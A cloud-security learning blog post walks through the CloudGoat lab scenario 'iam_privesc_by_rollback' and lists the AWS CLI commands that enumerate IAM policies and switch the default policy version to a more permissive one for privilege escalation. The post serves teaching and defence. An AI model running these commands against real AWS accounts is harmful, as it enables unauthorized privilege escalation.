---
title: '100 Days of Cloud Security - Day 1: Attack or Defend'
date: '2025-11-10'
author: 'Venkata Pathuri'
excerpt: 'Day 1 of my cloud security journey - Attack or Defend'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 1: Attack or Defend

## Overview
Welcome to the first day of our 100-day cloud security journey! Today, we kick things off with an exciting challenge: should we adopt an offensive posture and attack first, or take a defensive approach? This exploration is not just theoretical; it’s a practical dive into the vulnerabilities inherent in cloud environments, specifically focusing on AWS Identity and Access Management (IAM). By deploying a CloudGoat scenario, we’ll learn firsthand how to identify and exploit weaknesses, setting the stage for effective defenses. This foundational knowledge builds on our preliminary understanding of cloud security from Day 0, where we established the importance of proactive security measures.

## Learning Objectives
By the end of today’s session, you will master the process of identifying IAM vulnerabilities and exploiting them to escalate privileges. You’ll also gain insights into the effectiveness of attacking versus defending in cloud security contexts. More importantly, you’ll understand how to implement these lessons in real-world scenarios, enhancing your skills as a cloud security professional.

## Deep Dive
In our CloudGoat scenario, `iam_privesc_by_rollback`, our objective is clear: escalate privileges for the `raynor` user by restoring a previous version of a managed policy. This scenario highlights a common pitfall in IAM management—overlooked policy versions that can be exploited for privilege escalation.

### Understanding IAM and Policy Versions
AWS IAM allows you to manage access to AWS services and resources securely. Policies govern user permissions, and each managed policy can have multiple versions. The ability to roll back to a previous policy version can be a double-edged sword; while it provides flexibility in managing policies, it can also lead to security risks if proper controls are not in place.

**Real-World Example:**  
Consider a company that frequently updates its IAM policies to fine-tune user permissions. If an administrator inadvertently leaves a powerful version of a policy accessible, attackers could exploit this oversight to gain unauthorized access, potentially leading to data breaches or service disruptions.

### Step-by-Step Breakdown
1. **Confirm Your Identity:** Start by ensuring you are operating under the correct AWS credentials. Use the command:
   ```bash
   aws sts get-caller-identity --profile cloudgoat
   ```
   You should see your AWS account details, confirming your identity.

2. **List IAM Users:** Next, examine the IAM users in your account:
   ```bash
   aws iam list-users --profile cloudgoat
   ```
   This will help you identify the user you’re working with.

3. **Explore Policies:** Check both inline and managed policies attached to the `raynor` user:
   ```bash
   aws iam list-user-policies --user-name "raynor-cgiddrtz03apx6" --profile cloudgoat
   aws iam list-attached-user-policies --user-name "raynor-cgiddrtz03apx6" --profile cloudgoat
   ```

4. **Get Policy Metadata:** Identify the current default version of the managed policy:
   ```bash
   aws iam get-policy --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --query 'Policy' --profile cloudgoat
   ```

5. **List Policy Versions:** Retrieve all versions of the policy to find the one you can exploit:
   ```bash
   aws iam list-policy-versions --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --profile cloudgoat
   ```

6. **View Specific Versions:** Examine the policy documents for versions that grant additional permissions:
   ```bash
   aws iam get-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --version-id v1 --profile cloudgoat
   ```

7. **Set Default Policy Version:** Finally, to escalate privileges, set a more permissive version as default:
   ```bash
   aws iam set-default-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --version-id v3 --profile cloudgoat
   ```

**Common Pitfalls:**  
- Always perform these exercises in an isolated lab environment to prevent unintended consequences in production accounts.
- Ensure you have the appropriate permissions to execute these commands; otherwise, you will encounter access denied errors.

## Hands-On Practice
Following the outlined commands will allow you to practice privilege escalation in a controlled environment. Verify your success by checking the default policy version after executing the `set-default-policy-version` command. You should see the updated version reflected in your policy metadata.

## Key Takeaways
Today, we learned that understanding and exploiting IAM policy versions can lead to significant security vulnerabilities. By approaching cloud security from an attacker’s perspective, we gain critical insights into potential weaknesses, equipping us to build stronger defenses. We also recognized the importance of using isolated environments for testing to maintain the integrity of our production accounts.

## Real-World Applications
In real-world scenarios, organizations frequently face challenges with IAM misconfigurations. Regular audits and using tools like AWS IAM Access Analyzer can help identify risks before they are exploited. Additionally, implementing strict controls over policy version management can significantly enhance security posture.

## What's Next?
As we move into Day 2, we’ll build on today’s lessons by exploring automated tools that can help detect IAM vulnerabilities before they can be exploited. Get ready for a deeper dive into cloud security assessments and how to proactively safeguard your cloud environments!

---
**Journey Progress:** 1/100 Days Complete 🚀